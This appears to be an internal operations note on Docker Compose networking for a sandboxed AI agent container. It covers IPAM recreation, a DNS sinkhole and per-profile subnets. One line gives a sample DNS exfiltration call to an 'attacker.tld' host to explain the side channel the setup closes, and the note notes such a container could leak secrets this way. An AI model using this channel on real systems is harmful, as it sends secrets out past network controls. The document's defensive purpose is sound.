# Compose network IPAM changes need a full `down`, not just `--force-recreate`

`docker compose up -d --force-recreate` re-creates containers but **does not** re-create networks if their config drifts from what's on the daemon. So any change to `sandbox-internal`'s `ipam.config.subnet`, any service's `ipv4_address`, the agent's `dns:` / `extra_hosts`, or the network's `internal:` flag won't actually land via `recreate` / `rebuild` alone.

**Symptom:** `Error response from daemon: container <id> is not connected to the network macolima-<p>_sandbox-internal`. The container thinks the new compose says it should be on the network, the network exists with the old IPAM, Docker can't reconcile.

The trap got tripped when audit H2 introduced the static `172.30.0.0/24` subnet + `ipv4_address` per service. For any change in that class, the procedure is:

> **Since work/0001 A1 the third octet is per-profile** — `172.30.${SANDBOX_OCTET:-0}.0/24`, allocated by `profile.sh`. See "Per-profile subnet allocation" at the foot of this file. The `down`-not-`--force-recreate` rule below is unchanged and now matters more, because a profile's octet can legitimately change (pool collision) and moving a network under running containers is exactly the failure this doc exists to prevent.

```bash
COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> down
COMPOSE_PROFILES=db-postgres scripts/profile.sh <p> rebuild
```

`down` removes containers AND the network (named volumes are preserved without `-v`). The `COMPOSE_PROFILES` var must be the same across both calls so DB siblings come back on the new IPAM rather than getting stranded on a recreated network without an attached container.

If postgres / mongo were running on the old network when you skipped this step, their `restart: unless-stopped` policy keeps reattaching them to the old network, blocking removal — `docker network ls | grep macolima` then `docker network rm <name>` after stopping all attached containers.

## When this does NOT apply

Squid restart, bind-mount changes, env changes, command changes, image changes — none of those need a `down`. Only the IPAM/network-shape class. Don't reflexively `down` for every compose edit.

## DNS lockdown — why the static IPAM exists in the first place

Docker's built-in DNS resolver at `127.0.0.11` answers names for containers on the same network out of its embedded zone, and **forwards every other name to the host's resolver** — which queries authoritative DNS on the real internet. This forwarding happens regardless of whether the network is `internal: true`. So a container on `sandbox-internal` could:

```python
import socket; socket.getaddrinfo("base32-encoded-secret.attacker.tld", 0)
```

…and the attacker's authoritative NS would receive the subdomain label as a query. That's a textbook DNS exfiltration channel, and `internal: true` does not close it.

The fix has three parts in compose:

1. **Static subnet on `sandbox-internal`** (`ipam.config.subnet: 172.30.${SANDBOX_OCTET:-0}.0/24`) — required to pin sibling IPs.
2. **Static IPs on egress-proxy / postgres / mongo** (`networks.sandbox-internal.ipv4_address`).
3. **`claude-agent` gets `dns: [127.0.0.1]`** (sinkhole — no resolver listens there) **plus `extra_hosts`** entries that pre-populate `/etc/hosts` with the three internal names.

End state: any `getaddrinfo("egress-proxy")` resolves via `/etc/hosts`. Any `getaddrinfo("anything.else.tld")` returns NXDOMAIN — the libc resolver tries to query 127.0.0.1, gets ECONNREFUSED, gives up. Docker's embedded resolver is never queried (because we overrode `dns:`).

`verify-sandbox.sh` enforces both halves:

- `getent hosts example.com` must fail (external DNS does not resolve).
- `getent hosts egress-proxy` must succeed (internal hostnames still resolve).

**Don't "fix DNS"** by reverting `dns:` to Docker's default or adding `127.0.0.11` to it — that re-opens the side channel. If a tool inside the container needs a new internal hostname, add it to `extra_hosts` (and pin its IP via `ipv4_address` if it's a service we own).

---

## Per-profile subnet allocation (work/0001 A1)

**Why it exists.** `sandbox-internal` used to be hardcoded to `172.30.0.0/24`.
Docker's IPAM pool is **global to the engine**, not scoped to a compose project,
so a second profile's `up` failed with:

```
Error response from daemon: invalid pool request: Pool overlaps with other one on this address space
```

Distinct `COMPOSE_PROJECT_NAME`s do *not* prevent this — an earlier comment in
`docker-compose.yml` claimed they did, and that was wrong.

**How it works.** `SANDBOX_OCTET` drives the subnet, the three `ipv4_address`
pins and the three `extra_hosts` entries from one variable:

| Function | When | What it does |
|---|---|---|
| `ensure_subnet_octet` | every `profile.sh` command | reuse `<profiles>/<profile>/subnet-octet` if present; else pick the first octet free of other profiles' files, starting from `cksum(profile-name) % 256`. No docker calls. |
| `ensure_octet_free` | only `up` / `recreate` / `rebuild` | scan live docker networks; if our `/24` is held by anything other than our own `sandbox-internal`, bump to the next free octet and rewrite the file. |

`cksum` not `md5sum` — macOS has no `md5sum`. The whole allocator is in the
bash-3.2 subset because `/usr/bin/env bash` on this host is 3.2.57.

**One source of truth is the point.** DNS is sinkholed to `127.0.0.1`, so
`extra_hosts` is the agent's *only* name-resolution path. If the pins and the
hosts entries ever disagreed the agent would dial a dead IP — proxy mismatch
kills all egress, DB mismatch is connection-refused. Deriving both from
`SANDBOX_OCTET` makes that class of drift impossible. **Never write a literal
third octet into `docker-compose.yml`.**

**The `:-0` default** keeps the legacy `172.30.0.0/24` for direct
`docker compose` calls that never create a network — `PROFILE=_test docker
compose config`, and `restart` / `ps` / `down`, which act on the project by
label. Any script calling a *network-creating* verb must go through
`profile.sh`; this is why `setup.sh --recreate` delegates to
`profile.sh recreate` instead of calling `docker compose` itself.

**Migration.** A profile with no `subnet-octet` file reallocates off its name
hash on next `up`, which rebuilds its network. `therapod` was pre-seeded with
`0` so it stayed on the subnet it was already running (`echo 0 >
<profiles>/therapod/subnet-octet`). Do the same for any pre-existing profile you
do not want to move; a fresh profile needs nothing.
